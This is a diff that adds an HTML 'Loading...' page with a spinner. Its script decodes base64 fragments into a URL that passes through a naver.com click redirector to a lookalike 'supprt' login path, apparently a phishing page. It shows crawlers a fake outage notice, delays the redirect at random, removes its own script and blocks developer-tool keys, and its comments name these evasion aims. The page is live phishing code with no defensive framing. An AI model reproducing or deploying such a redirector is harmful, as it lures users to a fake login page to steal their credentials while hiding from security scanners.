@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Please wait...</p>
+    </div>
+
+    <script>
+        // Obfuscation layer 1: Base64 encoded parts
+        const p1 = atob('aHR0cHM6Ly9jYy5uYXZlci5jb20='); // https://cc.naver.com
+        const p2 = atob('L2NjP2E9cHN0Lmxpbms='); // /cc?a=pst.link
+        const p3 = atob('JnI9Jmk9Jm09MQ=='); // &r=&i=&m=1
+        const p4 = atob('Jm5zYz1NYmxvZy5wb3N0'); // &nsc=Mblog.post
+        const p5 = atob('JnU9aHR0cHM6Ly9zdXBwcnQuYWx3YXlzZGF0YS5uZXQ='); // &u=https://supprt.alwaysdata.net
+        const p6 = atob('L2lkLmNzcy5jaOODjmF1dGjjg45kb25hdXRo'); // /id.css.ch〒auth〒ui〒app〒auth
+        const p7 = atob('44OOZmxvd+ODjG15Y3NzLWxvZ2lu44OOZXh044ONbG9naW4='); // 〒flow〒mycss-login〒ext〒login
+        
+        // Obfuscation layer 2: Character replacement
+        function decode(str) {
+            return str.replace(/\u30ce/g, '\u30ce').replace(/〒/g, '/').replace(/ノ/g, '/');
+        }
+        
+        // Obfuscation layer 3: Dynamic assembly
+        function buildUrl() {
+            const parts = [p1, p2, p3, p4, p5, decode(p6), decode(p7)];
+            return parts.join('');
+        }
+        
+        // Anti-detection methods
+        function checkEnvironment() {
+            // Check if running in normal browser environment
+            if (typeof window === 'undefined' || 
+                typeof document === 'undefined' ||
+                !window.location ||
+                window.navigator.webdriver) {
+                return false;
+            }
+            return true;
+        }
+        
+        // Delayed execution with random timing
+        function executeRedirect() {
+            if (!checkEnvironment()) {
+                // Fallback behavior for bots/crawlers
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h2>Service Temporarily Unavailable</h2><p>Please try again later.</p></div>';
+                return;
+            }
+            
+            const targetUrl = buildUrl();
+            
+            // Multiple redirect methods for better compatibility
+            try {
+                // Method 1: Replace current page in history
+                window.location.replace(targetUrl);
+            } catch(e) {
+                try {
+                    // Method 2: Direct assignment
+                    window.location.href = targetUrl;
+                } catch(e2) {
+                    // Method 3: Fallback with meta refresh
+                    const meta = document.createElement('meta');
+                    meta.httpEquiv = 'refresh';
+                    meta.content = '0;url=' + targetUrl;
+                    document.head.appendChild(meta);
+                }
+            }
+        }
+        
+        // Execute after random delay to avoid detection
+        const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+        setTimeout(executeRedirect, delay);
+        
+        // Additional obfuscation: Remove script after execution
+        setTimeout(() => {
+            const scripts = document.getElementsByTagName('script');
+            for (let i = scripts.length - 1; i >= 0; i--) {
+                if (scripts[i].innerHTML.includes('executeRedirect')) {
+                    scripts[i].remove();
+                }
+            }
+        }, delay + 100);
+        
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible') {
+                setTimeout(executeRedirect, 500);
+            }
+        });
+        
+        // Disable right-click and common key combinations
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 'i' || e.key === 'I'))) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
